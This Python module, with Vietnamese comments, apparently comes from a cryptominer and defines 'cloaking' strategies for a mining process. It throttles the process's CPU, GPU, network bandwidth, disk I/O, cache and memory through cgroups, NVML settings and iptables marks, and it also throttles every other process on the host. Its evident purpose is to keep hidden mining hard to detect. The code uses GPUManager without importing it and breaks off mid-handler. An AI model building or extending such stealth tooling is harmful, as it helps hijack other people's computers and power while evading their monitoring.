# cloak_strategies.py

import os
import logging
import subprocess
import psutil
import pynvml
import traceback
from abc import ABC, abstractmethod
from typing import Dict, Any, List, Tuple, Optional, Type




from .utils import MiningProcess  # Import MiningProcess từ utils.py
from .resource_control import (
    CPUResourceManager,
    GPUResourceManager,
    NetworkResourceManager,
    DiskIOResourceManager,
    CacheResourceManager,
    MemoryResourceManager
)


class CloakStrategy(ABC):
    """
    Lớp cơ sở cho các chiến lược cloaking khác nhau.
    """

    @abstractmethod
    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng chiến lược cloaking cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        pass

    @abstractmethod
    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục các thiết lập cloaking cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        pass


class CpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking CPU:
      - Giới hạn sử dụng CPU thông qua việc áp dụng cgroups.
      - Tối ưu hóa việc sử dụng cache CPU.
      - Đặt affinity cho các thread vào các core CPU cụ thể.
      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
      - Hạn chế CPU sử dụng cho các tiến trình bên ngoài.
      - Tối ưu hóa scheduling cho các thread.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger
    ):
        """
        Khởi tạo CpuCloakStrategy với cấu hình và logger.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking CPU.
            logger (logging.Logger): Logger để ghi log.
        """
        # Lấy cấu hình throttle_percentage với giá trị mặc định là 20%
        self.throttle_percentage = config.get('throttle_percentage', 20)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
            self.throttle_percentage = 20

        # Lấy cấu hình throttle_external_percentage với giá trị mặc định là 30%
        self.throttle_external_percentage = config.get('throttle_external_percentage', 30)
        if not isinstance(self.throttle_external_percentage, (int, float)) or not (0 <= self.throttle_external_percentage <= 100):
            logger.warning("Giá trị throttle_external_percentage không hợp lệ, mặc định 30%.")
            self.throttle_external_percentage = 30

        # Lấy danh sách các tiến trình ngoại lai không bị hạn chế (nếu có)
        self.exempt_pids = config.get('exempt_pids', [])

        # Lấy cấu hình target_cores (core CPU để đặt affinity)
        self.target_cores = config.get('target_cores', None)  # Nếu None, sử dụng tất cả các core

        # Thêm thuộc tính để lưu trữ tên cgroup của tiến trình mục tiêu
        self.process_cgroup: Dict[int, str] = {}

        # Khởi tạo các ResourceManager trực tiếp
        self.cpu_resource_manager = CPUResourceManager(logger)

        self.logger = logger

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng chiến lược cloaking CPU cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Giới hạn sử dụng CPU cho tiến trình mục tiêu bằng cgroups
            cgroup_name = self.cpu_resource_manager.throttle_cpu_usage(pid, self.throttle_percentage)
            if cgroup_name:
                self.process_cgroup[pid] = cgroup_name
                self.logger.info(f"Giới hạn sử dụng CPU cho tiến trình {process_name} (PID: {pid}) thành công với throttle_percentage={self.throttle_percentage}%.")
            else:
                self.logger.error(f"Không thể giới hạn sử dụng CPU cho tiến trình {process_name} (PID: {pid}).")
                return

            # Tối ưu hóa việc sử dụng cache
            success_optimize_cache = self.cpu_resource_manager.optimize_cache_usage(pid)
            if success_optimize_cache:
                self.logger.info(f"Tối ưu hóa sử dụng cache cho tiến trình {process_name} (PID: {pid}) thành công.")
            else:
                self.logger.warning(f"Không thể tối ưu hóa sử dụng cache cho tiến trình {process_name} (PID: {pid}).")

            # Đặt CPU affinity
            success_affinity = self.cpu_resource_manager.optimize_thread_scheduling(pid, self.target_cores)
            if success_affinity:
                self.logger.info(f"Tối ưu hóa scheduling cho tiến trình {process_name} (PID: {pid}) thành công.")
            else:
                self.logger.warning(f"Không thể tối ưu hóa scheduling cho tiến trình {process_name} (PID: {pid}).")

            # Hạn chế CPU cho các tiến trình bên ngoài
            success_limit_external = self.cpu_resource_manager.limit_cpu_for_external_processes(
                target_pids=[pid] + self.exempt_pids,
                throttle_percentage=self.throttle_external_percentage
            )
            if success_limit_external:
                self.logger.info(f"Hạn chế CPU cho các tiến trình bên ngoài thành công với throttle_percentage={self.throttle_external_percentage}%.")
            else:
                self.logger.error(f"Không thể hạn chế CPU cho các tiến trình bên ngoài.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking CPU cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking CPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục các thiết lập cloaking CPU cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Khôi phục các thiết lập CPU bằng cách xóa cgroup
            cgroup_name = self.process_cgroup.get(pid)
            if cgroup_name:
                success_restore = self.cpu_resource_manager.restore_cpu_settings(cgroup_name)
                if success_restore:
                    self.logger.info(f"Khôi phục các thiết lập CPU cho tiến trình {process_name} (PID: {pid}) thành công.")
                else:
                    self.logger.error(f"Không thể khôi phục các thiết lập CPU cho tiến trình {process_name} (PID: {pid}).")
                del self.process_cgroup[pid]
            else:
                self.logger.warning(f"Không tìm thấy cgroup cho PID={pid} khi khôi phục.")

            # Hủy giới hạn CPU cho các tiến trình bên ngoài nếu cần
            success_unlimit_external = self.cpu_resource_manager.limit_cpu_for_external_processes(
                target_pids=[pid] + self.exempt_pids,
                throttle_percentage=0  # Đặt lại throttle_percentage về 0 để không hạn chế
            )
            if success_unlimit_external:
                self.logger.info("Đã hủy giới hạn CPU cho các tiến trình bên ngoài.")
            else:
                self.logger.error("Không thể hủy giới hạn CPU cho các tiến trình bên ngoài.")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking CPU cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục cloaking CPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name


class GpuCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking GPU:
      - Giới hạn power limit của GPU.
      - Tùy chọn điều chỉnh xung nhịp GPU.
      - Giới hạn nhiệt độ của GPU.
      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger
    ):
        """
        Khởi tạo GpuCloakStrategy với cấu hình và logger.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking GPU.
            logger (logging.Logger): Logger để ghi log.
        """
        # Lấy cấu hình throttle_percentage với giá trị mặc định là 20%
        self.throttle_percentage = config.get('throttle_percentage', 20)
        if not isinstance(self.throttle_percentage, (int, float)) or not (0 <= self.throttle_percentage <= 100):
            logger.warning("Giá trị throttle_percentage không hợp lệ, mặc định 20%.")
            self.throttle_percentage = 20

        # Lấy cấu hình sm_clock và mem_clock với các giá trị mặc định
        self.target_sm_clock = config.get('sm_clock', 1300)   # MHz
        self.target_mem_clock = config.get('mem_clock', 800)  # MHz

        # Lấy cấu hình temperature_threshold với giá trị mặc định là 80°C
        self.temperature_threshold = config.get('temperature_threshold', 80)  # °C
        if not isinstance(self.temperature_threshold, (int, float)) or self.temperature_threshold <= 0:
            logger.warning("Giá trị temperature_threshold không hợp lệ, mặc định 80°C.")
            self.temperature_threshold = 80

        # Lấy cấu hình fan_speed_increase với giá trị mặc định là 20% (nếu hỗ trợ)
        self.fan_speed_increase = config.get('fan_speed_increase', 20)  # %
        if not isinstance(self.fan_speed_increase, (int, float)) or not (0 <= self.fan_speed_increase <= 100):
            logger.warning("Giá trị fan_speed_increase không hợp lệ, mặc định 20%.")
            self.fan_speed_increase = 20

        # Khởi tạo GPUResourceManager trực tiếp
        self.gpu_resource_manager = GPUResourceManager(logger, GPUManager())

        self.logger = logger

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng chiến lược cloaking GPU cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Gán nhiều GPU cho tiến trình
            gpu_indices = self.assign_gpus(pid)
            if not gpu_indices:
                self.logger.warning(f"Không thể gán GPU cho tiến trình {process_name} (PID: {pid}).")
                return

            for gpu_index in gpu_indices:
                # Lưu trữ và thiết lập power limit
                desired_power_limit_w = self.calculate_desired_power_limit(gpu_index)
                success_power = self.gpu_resource_manager.set_gpu_power_limit(pid, gpu_index, desired_power_limit_w)
                if success_power:
                    self.logger.info(f"Đặt power limit GPU {gpu_index} thành công lên {desired_power_limit_w}W cho tiến trình {process_name} (PID: {pid}).")
                else:
                    self.logger.error(f"Không thể đặt power limit GPU {gpu_index} cho tiến trình {process_name} (PID: {pid}).")

                # Lưu trữ và thiết lập xung nhịp GPU
                success_clocks = self.gpu_resource_manager.set_gpu_clocks(pid, gpu_index, self.target_sm_clock, self.target_mem_clock)
                if success_clocks:
                    self.logger.info(f"Đặt xung nhịp GPU {gpu_index}: SM={self.target_sm_clock}MHz, MEM={self.target_mem_clock}MHz cho tiến trình {process_name} (PID: {pid}).")
                else:
                    self.logger.warning(f"Không thể đặt xung nhịp GPU {gpu_index} cho tiến trình {process_name} (PID: {pid}).")

                # Giới hạn nhiệt độ GPU
                success_temp = self.gpu_resource_manager.limit_temperature(
                    gpu_index,
                    self.temperature_threshold,
                    self.fan_speed_increase
                )
                if success_temp:
                    self.logger.info(f"Giới hạn nhiệt độ GPU {gpu_index} thành công cho tiến trình {process_name} (PID: {pid}).")
                else:
                    self.logger.warning(f"Không thể giới hạn nhiệt độ GPU {gpu_index} cho tiến trình {process_name} (PID: {pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking GPU cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking GPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục các thiết lập cloaking GPU cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Khôi phục các thiết lập GPU cho tiến trình
            success_restore_gpu = self.gpu_resource_manager.restore_resources(pid)
            if success_restore_gpu:
                self.logger.info(f"Đã khôi phục tất cả các thiết lập GPU cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể khôi phục các thiết lập GPU cho tiến trình {process_name} (PID: {pid}).")

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking GPU cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục cloaking GPU cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def calculate_desired_power_limit(self, gpu_index: int) -> int:
        """
        Tính toán power limit mới dựa trên throttle_percentage.

        Args:
            gpu_index (int): Chỉ số GPU.

        Returns:
            int: Power limit mới tính bằng Watts.
        """
        current_power_limit = self.gpu_resource_manager.get_gpu_power_limit(gpu_index)
        if current_power_limit is None:
            self.logger.warning(f"Không thể lấy power limit hiện tại cho GPU {gpu_index}. Sử dụng giá trị mặc định.")
            current_power_limit = 100  # Giá trị mặc định nếu không thể lấy

        desired_power_limit_w = int(round(current_power_limit * (1 - self.throttle_percentage / 100)))
        self.logger.debug(f"Tính toán power limit mới cho GPU {gpu_index}: {desired_power_limit_w}W.")
        return desired_power_limit_w

    def assign_gpus(self, pid: int) -> List[int]:
        """
        Gán nhiều GPU cho tiến trình dựa trên PID.

        Args:
            pid (int): PID của tiến trình.

        Returns:
            List[int]: Danh sách chỉ số GPU được gán hoặc trống nếu không thể gán.
        """
        gpu_count = self.gpu_resource_manager.gpu_manager.gpu_count
        if gpu_count <= 0:
            self.logger.warning("Không có GPU nào để gán.")
            return []

        # Ví dụ: Gán tất cả các GPU theo một chiến lược vòng quay dựa trên PID
        # Bạn có thể thay đổi chiến lược này theo nhu cầu
        # Ở đây, chúng ta gán tất cả các GPU
        assigned_gpus = list(range(gpu_count))
        self.logger.debug(f"Đã gán các GPU {assigned_gpus} cho PID {pid}.")
        return assigned_gpus

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name


class NetworkCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking mạng:
      - Giảm băng thông mạng cho tiến trình.
      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger
    ):
        """
        Khởi tạo NetworkCloakStrategy với cấu hình và logger.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Network.
            logger (logging.Logger): Logger để ghi log.
        """
        # Lấy cấu hình bandwidth_reduction_mbps với giá trị mặc định là 10Mbps
        self.bandwidth_reduction_mbps = config.get('bandwidth_reduction_mbps', 10)
        if not isinstance(self.bandwidth_reduction_mbps, (int, float)) or self.bandwidth_reduction_mbps <= 0:
            logger.warning("Giá trị bandwidth_reduction_mbps không hợp lệ, mặc định 10Mbps.")
            self.bandwidth_reduction_mbps = 10

        # Lấy cấu hình network_interface hoặc tự động xác định
        self.network_interface = config.get('network_interface')
        self.logger = logger

        # Khởi tạo NetworkResourceManager trực tiếp
        self.network_resource_manager = NetworkResourceManager(logger)

        if not self.network_interface:
            self.network_interface = self.get_primary_network_interface()
            if not self.network_interface:
                self.logger.warning("Không thể xác định giao diện mạng. Mặc định là 'eth0'.")
                self.network_interface = "eth0"
            self.logger.info(f"Giao diện mạng chính xác định: {self.network_interface}")

        # Thêm thuộc tính để lưu trữ fwmark cho tiến trình
        self.process_marks: Dict[int, int] = {}

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng chiến lược cloaking mạng cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Định nghĩa fwmark cho tiến trình cụ thể
            mark = pid % 32768  # fwmark phải < 65536
            self.logger.debug(f"Đặt fwmark={mark} cho tiến trình PID={pid}.")

            # Thêm quy tắc iptables để đánh dấu các gói tin từ PID này
            success_mark = self.network_resource_manager.mark_packets(pid, mark)
            if not success_mark:
                self.logger.error(f"Không thể thêm iptables MARK cho tiến trình {process_name} (PID: {pid}) với mark={mark}.")
                return

            # Thiết lập băng thông mạng thông qua NetworkResourceManager
            success_limit = self.network_resource_manager.limit_bandwidth(
                self.network_interface,
                mark,
                self.bandwidth_reduction_mbps
            )
            if not success_limit:
                self.logger.error(f"Không thể giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}) với mark={mark} trên giao diện '{self.network_interface}'.")
                return

            # Lưu trữ mark để khôi phục sau này
            self.process_marks[pid] = mark

            self.logger.info(
                f"Áp dụng cloaking mạng cho tiến trình {process_name} (PID: {pid}): "
                f"Giới hạn băng thông={self.bandwidth_reduction_mbps}Mbps trên giao diện '{self.network_interface}'."
            )

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking mạng cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking mạng cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục các thiết lập cloaking mạng cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Lấy fwmark đã lưu trữ
            mark = self.process_marks.get(pid)
            if mark is None:
                self.logger.warning(f"Không tìm thấy fwmark cho PID={pid} khi khôi phục.")
                return

            # Xóa giới hạn băng thông mạng
            success_remove = self.network_resource_manager.remove_bandwidth_limit(
                self.network_interface,
                mark
            )
            if success_remove:
                self.logger.info(f"Khôi phục giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}) thành công.")
            else:
                self.logger.error(f"Không thể khôi phục giới hạn băng thông mạng cho tiến trình {process_name} (PID: {pid}).")

            # Xóa quy tắc iptables MARK
            success_unmark = self.network_resource_manager.unmark_packets(pid, mark)
            if success_unmark:
                self.logger.info(f"Xóa iptables MARK cho tiến trình {process_name} (PID: {pid}) thành công.")
            else:
                self.logger.error(f"Không thể xóa iptables MARK cho tiến trình {process_name} (PID: {pid}).")

            # Xóa mark khỏi lưu trữ
            del self.process_marks[pid]

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking mạng cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục cloaking mạng cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name

    def get_primary_network_interface(self) -> Optional[str]:
        """
        Tự động xác định giao diện mạng chính.

        Returns:
            Optional[str]: Tên giao diện mạng hoặc None nếu không xác định được.
        """
        try:
            addrs = psutil.net_if_addrs()
            for iface, addr_list in addrs.items():
                for addr in addr_list:
                    if addr.family == psutil.AF_LINK:
                        # Giả sử giao diện có địa chỉ MAC là giao diện chính
                        return iface
            return None
        except Exception as e:
            self.logger.error(f"Lỗi khi xác định giao diện mạng chính: {e}")
            return None


class DiskIoCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Disk I/O:
      - Đặt trọng số I/O cho tiến trình bằng cách sử dụng DiskIOResourceManager.
      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger
    ):
        """
        Khởi tạo DiskIoCloakStrategy với cấu hình và logger.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Disk I/O.
            logger (logging.Logger): Logger để ghi log.
        """
        # Lấy cấu hình io_weight với giá trị mặc định là 500
        self.io_weight = config.get('io_weight', 500)
        if not isinstance(self.io_weight, int) or not (1 <= self.io_weight <= 1000):
            logger.warning(f"Giá trị io_weight không hợp lệ: {self.io_weight}. Mặc định là 500.")
            self.io_weight = 500
        self.logger = logger

        # Khởi tạo DiskIOResourceManager trực tiếp
        self.disk_io_resource_manager = DiskIOResourceManager(logger)

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng chiến lược cloaking Disk I/O cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Đặt trọng số I/O thông qua DiskIOResourceManager
            success = self.disk_io_resource_manager.set_io_weight(pid, self.io_weight)
            if success:
                self.logger.info(f"Đặt I/O weight là {self.io_weight} cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể đặt I/O weight là {self.io_weight} cho tiến trình {process_name} (PID: {pid}).")
                return

            self.logger.info(
                f"Áp dụng cloaking Disk I/O cho tiến trình {process_name} (PID: {pid}): io_weight={self.io_weight}."
            )

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking Disk I/O cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi áp dụng cloaking Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục các thiết lập cloaking Disk I/O cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Xóa trọng số I/O
            success = self.disk_io_resource_manager.set_io_weight(pid, 1000)  # Giả sử 1000 là trọng số tối đa
            if success:
                self.logger.info(f"Khôi phục I/O weight cho tiến trình {process_name} (PID: {pid}) thành công.")
            else:
                self.logger.error(f"Không thể khôi phục I/O weight cho tiến trình {process_name} (PID: {pid}).")

            self.logger.info(
                f"Khôi phục cloaking Disk I/O cho tiến trình {process_name} (PID: {pid}) đã hoàn thành."
            )

        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking Disk I/O cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi khi khôi phục cloaking Disk I/O cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name


class CacheCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Cache:
      - Drop caches.
      - Giới hạn mức sử dụng cache thông qua CacheResourceManager.
      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger
    ):
        """
        Khởi tạo CacheCloakStrategy với cấu hình và logger.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Cache.
            logger (logging.Logger): Logger để ghi log.
        """
        # Lấy cấu hình cache_limit_percent với giá trị mặc định là 50%
        self.cache_limit_percent = config.get('cache_limit_percent', 50)
        if not (0 <= self.cache_limit_percent <= 100):
            logger.warning(f"Giá trị cache_limit_percent không hợp lệ: {self.cache_limit_percent}. Mặc định là 50%.")
            self.cache_limit_percent = 50
        self.logger = logger

        # Khởi tạo CacheResourceManager trực tiếp
        self.cache_resource_manager = CacheResourceManager(logger)

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng chiến lược cloaking Cache cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Drop caches thông qua CacheResourceManager
            success_drop = self.cache_resource_manager.drop_caches()
            if success_drop:
                self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể drop caches cho tiến trình {process_name} (PID: {pid}).")

            # Giới hạn cache sử dụng thông qua CacheResourceManager
            success_limit = self.cache_resource_manager.limit_cache_usage(self.cache_limit_percent)
            if success_limit:
                self.logger.info(f"Đặt giới hạn cache thành {self.cache_limit_percent}% cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể đặt giới hạn cache cho tiến trình {process_name} (PID: {pid}).")

            self.logger.info(
                f"Áp dụng cloaking Cache cho tiến trình {process_name} (PID: {pid}): "
                f"drop_caches=True, cache_limit_percent={self.cache_limit_percent}%."
            )

        except PermissionError as e:
            self.logger.error(
                f"Không đủ quyền để drop caches. Cloaking Cache thất bại cho tiến trình {process.name} (PID: {process.pid})."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking Cache cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi bất ngờ khi áp dụng cloaking Cache cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục các thiết lập cloaking Cache cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Reset cache usage bằng cách không giới hạn
            success_limit = self.cache_resource_manager.limit_cache_usage(100)  # Đặt lại về 100%
            if success_limit:
                self.logger.info(f"Khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}) thành công.")
            else:
                self.logger.error(f"Không thể khôi phục giới hạn cache cho tiến trình {process_name} (PID: {pid}).")

            self.logger.info(
                f"Khôi phục cloaking Cache cho tiến trình {process_name} (PID: {pid}) đã hoàn thành."
            )

        except PermissionError as e:
            self.logger.error(
                f"Không đủ quyền để khôi phục cloaking Cache cho tiến trình {process.name} (PID: {process.pid})."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để khôi phục cloaking Cache cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi bất ngờ khi khôi phục cloaking Cache cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def get_process_info(self, process: MiningProcess) -> Tuple[int, str]:
        """
        Lấy PID và tên tiến trình từ đối tượng process.

        Args:
            process (MiningProcess): Đối tượng tiến trình.

        Returns:
            Tuple[int, str]: PID và tên tiến trình.
        """
        return process.pid, process.name


class MemoryCloakStrategy(CloakStrategy):
    """
    Chiến lược cloaking Memory:
      - Giới hạn sử dụng bộ nhớ của tiến trình.
      - Giảm sử dụng bộ nhớ bằng cách drop caches nếu cần thiết.
      - Khôi phục các thiết lập ban đầu khi không còn cần cloaking.
    """

    def __init__(
        self,
        config: Dict[str, Any],
        logger: logging.Logger
    ):
        """
        Khởi tạo MemoryCloakStrategy với cấu hình và logger.

        Args:
            config (Dict[str, Any]): Cấu hình cho chiến lược cloaking Memory.
            logger (logging.Logger): Logger để ghi log.
        """
        # Lấy cấu hình memory_limit_percent với giá trị mặc định là 50%
        self.memory_limit_percent = config.get('memory_limit_percent', 50)
        if not (0 <= self.memory_limit_percent <= 100):
            logger.warning(f"Giá trị memory_limit_percent không hợp lệ: {self.memory_limit_percent}. Mặc định là 50%.")
            self.memory_limit_percent = 50
        self.logger = logger

        # Khởi tạo MemoryResourceManager và CacheResourceManager trực tiếp
        self.memory_resource_manager = MemoryResourceManager(logger)
        self.cache_resource_manager = CacheResourceManager(logger)

    def apply(self, process: MiningProcess) -> None:
        """
        Áp dụng chiến lược cloaking Memory cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Drop caches sử dụng CacheResourceManager
            success_drop = self.cache_resource_manager.drop_caches()
            if success_drop:
                self.logger.info(f"Đã drop caches để giảm sử dụng cache cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể drop caches cho tiến trình {process_name} (PID: {pid}).")

            # Giới hạn sử dụng bộ nhớ sử dụng MemoryResourceManager
            memory_limit_mb = self.calculate_memory_limit_mb()
            success_limit = self.memory_resource_manager.set_memory_limit(pid, memory_limit_mb)
            if success_limit:
                self.logger.info(f"Đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% ({memory_limit_mb}MB) cho tiến trình {process_name} (PID: {pid}).")
            else:
                self.logger.error(f"Không thể đặt giới hạn bộ nhớ thành {self.memory_limit_percent}% cho tiến trình {process_name} (PID: {pid}).")

            self.logger.info(
                f"Áp dụng cloaking Memory cho tiến trình {process_name} (PID: {pid}): "
                f"drop_caches=True, memory_limit_percent={self.memory_limit_percent}%."
            )

        except PermissionError as e:
            self.logger.error(
                f"Không đủ quyền để drop caches. Cloaking Memory thất bại cho tiến trình {process.name} (PID: {process.pid})."
            )
            raise
        except psutil.NoSuchProcess as e:
            self.logger.error(f"Tiến trình không tồn tại: {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"Không đủ quyền để áp dụng cloaking Memory cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"Lỗi bất ngờ khi áp dụng cloaking Memory cho tiến trình {process.name} (PID: {process.pid}): {e}\n{traceback.format_exc()}"
            )
            raise

    def restore(self, process: MiningProcess) -> None:
        """
        Khôi phục các thiết lập cloaking Memory cho tiến trình đã cho.

        Args:
            process (MiningProcess): Đối tượng tiến trình.
        """
        try:
            pid, process_name = self.get_process_info(process)

            # Giới hạn bộ nhớ về không giới hạn
            success_limit = self.memory_resource_manager.remove_memory_limit(pid)
            if success_limit:
                self.logger.info(f"Khôi phục giới hạn bộ nhớ cho tiến trình {process_name} (PID: {pid}) thành công.")
            else:
                self.logger.error(f"Không thể khôi phục giới hạn bộ nhớ cho tiến trình {process_name} (PID: {pid}).")

            # Không cần drop caches lại khi khôi phục

            self.logger.info(
                f"Khôi phục cloaking Memory cho tiến trình {process_name} (PID: {pid}) đã hoàn thành."
            )

        except PermissionError as e:
            self.logger.error(
